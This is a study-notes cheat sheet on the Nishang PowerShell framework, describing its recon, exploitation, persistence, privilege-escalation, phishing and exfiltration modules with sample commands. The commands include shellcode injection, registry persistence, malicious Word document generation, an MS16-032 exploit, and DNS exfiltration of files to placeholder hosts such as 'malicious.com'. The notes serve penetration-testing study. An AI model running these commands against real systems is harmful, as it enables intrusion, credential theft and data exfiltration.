The [Nishang Framework][https://github.com/samratashok/nishang] is a collection of PowerShell scripts and modules designed for penetration testing, post-exploitation, and red teaming. It leverages PowerShell's versatility to provide a wide range of tools for reconnaissance, exploitation, persistence, privilege escalation, and more.
##### Features of Nishang
1. **Reconnaissance**:
    - Tools for gathering information about the target system, network, and users.
2. **Exploitation**:
    - Scripts to exploit vulnerabilities and execute payloads.
3. **Persistence**:
    - Tools to establish and maintain access to compromised systems.
4. **Privilege Escalation**:
    - Scripts for identifying and exploiting privilege escalation opportunities.
5. **Phishing and Credential Harvesting**:
    - Tools to capture credentials using phishing techniques.
6. **Exfiltration**:
    - Scripts for data exfiltration and bypassing defenses.

##### Modules in Nishang
The Nishang Framework is divided into several modules, each catering to a specific phase of penetration testing or exploitation. Below are the key modules and their purposes:
**1. Recon**
- **Purpose**: Gather information about the target environment.
- **Example Scripts**:
    - `Get-WLAN-Keys.ps1`: Retrieves saved Wi-Fi passwords.
    - `Get-Information.ps1`: Collects detailed system and user information.
**Example: Collect System Information**
```powershell
Import-Module .\Recon\Get-Information.ps1
Get-Information
```
**2. Exploitation**
- **Purpose**: Exploit vulnerabilities and execute arbitrary code.
- **Example Scripts**:
    - `Invoke-PsExec.ps1`: Executes commands on remote systems using SMB.
    - `ShellcodeLauncher.ps1`: Injects shellcode into memory.
**Example: Execute Shellcode**
```powershell
Import-Module .\Exploitation\ShellcodeLauncher.ps1
Invoke-ShellcodeLauncher -ShellcodePath "C:\Path\To\Shellcode.bin"
```
**3. Persistence**
- **Purpose**: Create mechanisms to maintain access after reboot.
- **Example Scripts**:
    - `Add-ScrnPersistence.ps1`: Persists a payload via the screensaver.
    - `Add-RegistryPersistence.ps1`: Persists payloads using registry keys.
**Example: Create Registry Persistence**
```powershell
Import-Module .\Persistence\Add-RegistryPersistence.ps1
Add-RegistryPersistence -Script "C:\Payload.ps1" -Name "PersistenceKey"
```
**4. Privilege Escalation**
- **Purpose**: Identify and exploit opportunities to gain higher privileges.
- **Example Scripts**:
    - `Invoke-MS16-032.ps1`: Exploits a Windows vulnerability for privilege escalation.
    - `Get-ServicePrivilege.ps1`: Lists services that could allow privilege escalation.
**Example: Exploit MS16-032**
```powershell
Import-Module .\Privesc\Invoke-MS16-032.ps1
Invoke-MS16-032
```
**5. Phishing**
- **Purpose**: Capture user credentials or deliver payloads through phishing.
- **Example Scripts**:
    - `Out-Word.ps1`: Generates a malicious Microsoft Word document.
    - `Out-Webpage.ps1`: Creates a phishing webpage to capture credentials.
**Example: Generate a Malicious Document**
```powershell
Import-Module .\Phishing\Out-Word.ps1
Out-Word -PayloadPath "C:\Payload.ps1" -OutputPath "Malicious.doc"
```
**6. Exfiltration**
- **Purpose**: Extract data from compromised systems.
- **Example Scripts**:
    - `Out-DNS.ps1`: Exfiltrates data via DNS queries.
    - `Out-Compressed.ps1`: Compresses and encrypts files for exfiltration.
**Example: Exfiltrate Data via DNS**
```powershell
Import-Module .\Exfiltration\Out-DNS.ps1
Out-DNS -FilePath "C:\SensitiveData.txt" -Domain "exfil.example.com"
```
**7. Miscellaneous**
- **Purpose**: Utility scripts for various tasks.
- **Example Scripts**:
    - `Invoke-PortScan.ps1`: Scans ports on a remote system.
    - `Get-PassHashes.ps1`: Extracts NTLM hashes from the SAM database.
**Example: Perform a Port Scan**
```powershell
Import-Module .\Miscellaneous\Invoke-PortScan.ps1
Invoke-PortScan -Target "192.168.1.1" -Ports 21,22,80,443
```

##### How Nishang Works
Nishang relies on PowerShell's ability to interact directly with Windows subsystems, making it an effective tool for offensive operations. It uses techniques such as:
1. **In-Memory Execution**:
    - Scripts are loaded and executed in memory, avoiding disk-based detection mechanisms.
2. **Living Off the Land (LOTL)**:
    - Exploits built-in Windows utilities like PowerShell to avoid raising red flags.
3. **Custom Payloads**:
    - Allows users to create and deploy custom scripts or payloads tailored to their needs.

##### Common Use Cases
1. **Initial Reconnaissance**:
    - Gather details about the target system and network.
```powershell
Import-Module .\Recon\Get-Information.ps1
Get-Information
```
**Command Execution on Remote Systems**:
- Execute commands on a remote target using `Invoke-PsExec.ps1`.
```powershell
Invoke-PsExec -Target "192.168.1.100" -Command "whoami"
```
**Data Exfiltration**:
- Exfiltrate sensitive files via DNS
```powershell
Out-DNS -FilePath "C:\Secret.txt" -Domain "malicious.com"
```
**Privilege Escalation**:
- Use `Invoke-MS16-032.ps1` to escalate privileges.
```powershell
Invoke-MS16-032
```

## Done !
Check out other cheat sheets and study notes using the below link
```
https://shop.motasem-notes.net
https://buymeacoffee.com/notescatalog
```


